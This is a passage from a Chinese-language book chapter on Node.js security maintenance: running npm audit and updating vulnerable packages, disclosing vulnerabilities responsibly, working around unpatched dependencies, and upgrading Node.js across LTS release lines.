*软件包* 列指出漏洞所在的软件包，*依赖项* 列指出父软件包，*路径* 列提供了有问题的软件包的完整逻辑路径。 *修补版本* 列（如果存在）给出了已知可以修复该软件包的版本范围。在这些结果中，npm 审核已确定可以自动修复前两个与 `js-yaml` 相关的漏洞，而第三个 `hoek` 软件包必须手动修复。

npm 输出还显示了一个命令，您可以运行此命令来更新软件包（如果适用）。运行以下命令，这是 npm 审核建议用于修复前两个漏洞的命令：

```
$ npm update js-yaml --depth 1
```

这样做将软件包升级到已知良好的版本，该版本应仍与 *package.json* 文件中指定的 SemVer 范围兼容。在我的情况下，`js-yaml@³.9.1` 的依赖性在 *package.json* 和 *package-lock.json* 中都更改为使用 `js-yaml@³.14.0`。

在这一点上，如果您再次运行 **`npm audit`** 命令，您只会看到列出的 `hoek` 软件包。不幸的是，`npm audit` 不会提供修复此软件包的建议。但基于 *修补版本* 列中列出的版本范围，已知软件包在版本 `4.2.1` 中已修复。运行以下命令手动修复这个有漏洞的软件包：

```
$ npm update hoek
```

在我的情况下，软件包从 `hoek@⁴.2.0` 升级到 `hoek@⁴.2.1`。

`npm audit` 命令可以稍作调整，仅列出超过某个严重级别的漏洞。还请注意，如果遇到有漏洞的软件包，`npm audit` 命令会返回非零状态代码。这可以作为每晚定时任务的一部分来监视应用程序的健康状况。但不应将其用作持续集成测试的一部分，因为已成为有漏洞并安装在主分支上的软件包不应导致不引入有问题软件包的拉取请求失败。

这是一个命令的版本，用于在非开发依赖项具有被视为高级或更高级别漏洞时失败检查：

```
$ npm audit --audit-level=high --only=prod ; echo $?
```

不幸的是，有时您会遇到存在漏洞但尚未发布修补版本的软件包。

## 未修补的漏洞

在职业生涯的某个阶段，您可能会发现由第三方维护的软件包中存在漏洞。虽然立即在社交媒体上公布您的发现可能很诱人，但这样做只会使依赖于该软件包的应用程序（包括您自己的应用程序）面临风险！相反，最好向软件包的作者发送一条私信，披露漏洞和利用它所需的步骤。这是一种[负责任的披露](https://en.wikipedia.org/wiki/Responsible_disclosure)形式，在通知黑客之前给予修复漏洞的时间。

为了简化这个过程，npm 有一个页面，您可以报告[安全漏洞](https://www.npmjs.com/advisories/report)。此页面要求提供您的联系信息、包的名称以及受漏洞影响的版本范围。它还包含一个描述字段，您应该使用它来提供使用该包进行攻击的概念验证。如果您没有提供，那么 npm 的某人将会给您发送电子邮件以请求概念验证。一旦 npm 验证了漏洞，它将联系作者，并标记有问题的包为脆弱的。

如果您知道如何修复问题，创建一个拉取请求肯定可以加快进程，但这样做可能会太过公开。您还可以生成一个“补丁”，通过运行**`git diff --patch`**将其发送给作者（或在安全报告描述中提供）以修复问题，假设您在本地存储库克隆中进行了更改。如果您提供了如何破坏它和如何修复它的示例，该包更有可能被修补。

无论是您首次发现漏洞还是其他人公开了它，您仍然陷入同样的困境：需要保护应用程序免受漏洞威胁。如果包的修复版本已发布，并且它是直接依赖项，则最好的做法是更新依赖项并部署。如果易受攻击的包是子依赖项，则如果其父依赖项使用版本范围，则您可能会有好运。

您可能会陷入无法简单替换易受攻击包的情况。也许该包从根本上是不安全的，无法修复。也许该包已经不再维护，没有人可以修复它。

当这种情况发生时，您有几种选择。如果您可以直接控制信息如何传递到一个包中，并且知道它是如何失败的，比如调用`foo.run(user_input)`时使用数字而不是字符串，那么您可以在应用程序中包装该函数调用，并将值强制转换为可接受的类型，使用正则表达式去除不良输入等。进行代码更改，添加一个“TODO”注释，以便在包最终升级时删除包装，并部署。

如果该包是直接依赖项并且已被弃用且有漏洞，则您可能希望寻找另一个执行相同功能的包。您还可以分叉该包，应用修复并在 npm 上以新名称发布。然后，修改*package.json*以使用您的分叉包。

几年前，一个解析查询字符串的包中发现了一个漏洞。攻击者可以提供包含大索引的数组查询参数的 HTTP 请求，如 `a[0][999999999]=1`。然后该包创建了一个极大的数组（而不是使用对象等其他表示方式），导致进程崩溃。我们团队拥有的一个应用程序受到了影响。修复方法相对比较直接，但不幸的是，依赖层级较深。我的一位同事通宵与每个依赖项的维护者合作，促使他们发布不再依赖受影响包的新版本。

处理涉及协议的漏洞更加困难。如果一个包处理应用程序中更深层次的函数调用，你可以拦截调用并清理数据。但如果漏洞位于应用程序最浅层，例如由框架加载用于解析 HTTP 的包时，可能需要依赖反向代理来清理请求。例如，尽管你的应用程序可能使用的框架容易受到慢 `POST` 攻击的影响（将请求主体分割成小块，并在长时间内发送每个块），但可以配置 HAProxy 来终止连接以防止此类攻击，从而释放服务器资源。

# 升级 Node.js

Node.js 发布版本偶尔会发现漏洞。例如，Node.js v12 和 v14 发布系列在某些时候都存在 [CVE-2020-8172](https://oreil.ly/lUoVq) 和 [CVE-2020-11080](https://oreil.ly/mw2IP) 这两个漏洞，这两个漏洞影响了内置的 `http` 模块。这些问题在 v12.18.0 和 v14.4.0 版本中得到了修复。安全修复通常在当前发布系列的次要 SemVer 版本中实施，并后移至活跃的 LTS 发布系列以及可能的维护 LTS 发布系列。

保持 Node.js 安全发布的最新状态非常重要。除了安全更新外，Node.js 发布还带来了新功能和性能更新。通常建议升级，但也需注意一些注意事项，这也是大多数组织不会立即升级到最新版本的原因。尤其是性能可能会出现退化，或者兼容性问题；Node.js 虽然遵循 SemVer，但有时依赖项使用的是私有内部 API，可能会发生变化。

通常情况下，当应用程序切换到较新的 Node.js 版本时，需要重新进行测试。当然，正常测试应该通过，但通常需要工程师执行手动验收测试以确保。`node_modules` 目录越大，应用程序与 Node.js 运行时新版本的兼容性问题就越可能出现。

## Node.js LTS 日程安排

Node.js 使用的版本控制方法受到 Linux 内核旧实践的启发。奇数版本（v13、v11）代表一种类似测试版的阶段，包的作者可以检查兼容性。奇数版本中的代码最终会进入下一个偶数版本。不应将奇数版本的 Node.js 用于生产环境。例如，写作本书时，v13 版本对我来说很有用，因为等待 v14 发布。

Node.js 的偶数发布版本被称为 *LTS*（长期支持）版本。Node.js 的 LTS 版本经历几个不同的阶段。在第一个阶段，发布被标记为“Current”。六个月后，发布变为“Active”，大约持续一年。一年后，发布进入“Maintenance”阶段。在此期间，将某些新特性，尤其是安全补丁，回溯到下一个“Current”发布的 LTS 版本中。

这个概念也受到 Linux 内核的启发。 LTS 发布非常重要，因为组织需要能够长时间运行他们的应用程序。如果主要版本保持不变，升级应用程序运行的 Node.js 版本就会更容易。Figure 10-3 是截至 2020 年 7 月的 Node.js LTS 发布时间表的示例，生成于 Node.js v14 达到“Active”阶段之前。

![Node.js LTS 发布时间表](img/dsnj_1003.png)

###### 图 10-3\. Node.js LTS 发布时间表^(5)

一旦一个主要版本结束维护阶段，它就达到了 *生命周期结束*。这时将不会有该主要版本的新发布，包括任何错误修复或安全补丁。

## 升级方法

构建 Node.js 微服务的组织通常会涉及跨多个 Node.js 版本的应用程序集合。在许多情况下，这些组织可能没有保持应用程序在现代 Node.js 运行时版本上的策略，或者保持运行时更新可能成为一种未优先考虑的技术债务。这些情况很危险，可能导致应用程序受损。^(6)

我喜欢采取的方法首先是将服务分为三代类别。第一代包括运行在当前 LTS 线上的应用程序，如运行在 Node.js v14 上的应用程序。第二代服务是运行在前一个维护 LTS 版本上的应用程序，如 Node.js v12。第三代包括其他所有内容，如 Node.js v10（非常旧）或 v13（非 LTS 发布线）。这些可以被视为当前、维护和“不良”代。

所有 naughty generation 中的应用程序必须升级。这是最重要的工作优先级。这些应用程序应该升级到当前 LTS 发布版本，最好是最新的主要和次要版本。将它们迁移到维护 LTS 并不太合理，因为该版本的支持时间不会太长。

直接从 naughty Node.js 版本直接升级到最新版本可能会很痛苦。例如，使用 Node.js v10.2.3 的应用程序可能与 Node.js v14.4.0 完全不兼容。相反，跳转到几个不同的 Node.js 版本可能更容易。可以简化此过程的一种方法是跳转到每个 LTS 发布的最高版本，从当前使用的版本开始，直到达到最新版本。在这种情况下，可能意味着从 v10.2.3 升级到 v10.21.0，然后是 v12.18.2，最后是 v14.4.0。

采用这种方法，可以在每个不同的版本上重新测试应用程序以确保兼容性。这有助于将升级过程分解为较小的步骤，使整个过程更加容易。在此过程中，您可能需要运行应用程序，查找错误，并根据需要升级 npm 包或更改代码。阅读 Node.js 更新日志，了解主要版本中的重大变更和次要版本中的新功能，以帮助这一过程。每次修复与 Node.js 版本的兼容性后，都应创建一个新的提交。一旦最终达到最新的 Node.js 版本，然后可以编写包含各个单独提交的拉取请求。这有助于审阅者理解代码和包变更与 Node.js 版本的关联性。

随着时间的推移，您需要保持剩余的 Node.js 应用程序更新。维护期间的应用程序无需升级到当前版本。相反，请等待新的 LTS 版本发布。一旦发布了新的 LTS 版本，维护期间的应用程序从技术上来说现在是“naughty generation”。然后应将它们升级以使用当前的 Node.js 发布版本。当前代的应用程序现在处于维护期。同样，它们可以等待下一个 LTS 版本的发布。按代别批量更新应用程序的这种交替方法对我很有帮助。

使用像 [nvm](https://github.com/nvm-sh/nvm)（Node Version Manager）或 [nodenv](https://github.com/nodenv/nodenv) 这样的工具可以简化在本地开发机器上多个 Node.js 版本之间切换的过程。首先，nvm 使用更手动的方法，在当前 shell 会话中选择要使用的 Node.js 版本。另一方面，nodenv 使用 *.node-version* 文件，在终端中更改目录时自动设置 Node.js 运行时版本。可以将此文件检入应用程序仓库，以自动化切换 Node.js 运行时。

^(1) 已知的几十种恶意包括*getcookies*、*crossenv*、*mongose*和*babelcli*。

^(2) 从技术上讲，您的 shell 可能会将您运行的每个命令写入历史文件，但是生产过程中的启动器不会出现此问题。

^(3) 此数据库源自 Node 安全项目，并由 npm 在收购^Lift 后进行管理。

^(4) 自从本书编写时，GitHub 最近收购了 npm。在此收购之前，npm audit 和 Dependabot 已存在，我预计这两个产品将在未来几年融合发展。

^(5) 图片由 Colin Ihrig 根据 Apache License 2.0 提供。

^(6) 如果您发现这种情况发生，请您介入并带头推动升级过程。
